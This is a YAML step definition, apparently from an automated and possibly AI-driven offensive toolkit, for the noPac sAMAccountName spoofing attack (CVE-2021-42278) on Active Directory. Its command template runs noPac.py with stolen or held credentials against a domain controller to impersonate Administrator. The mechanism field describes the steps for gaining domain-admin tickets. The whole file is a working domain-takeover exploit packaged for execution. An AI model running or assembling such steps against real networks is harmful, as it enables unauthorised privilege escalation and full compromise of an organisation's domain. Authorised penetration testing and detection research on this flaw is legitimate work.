name: samaccountname_spoof
category: ad
description: sAMAccountName spoofing (noPac/CVE-2021-42278)
preconditions:
  - domain_joined
  - has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: "python3 noPac.py '{domain}/{username}:{password}' -dc-ip {target_ip} --impersonate Administrator -use-ldap"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Creates machine account, renames to DC name (minus $), requests TGT, renames back, requests S4U2self as DA. Requires MachineAccountQuota > 0."
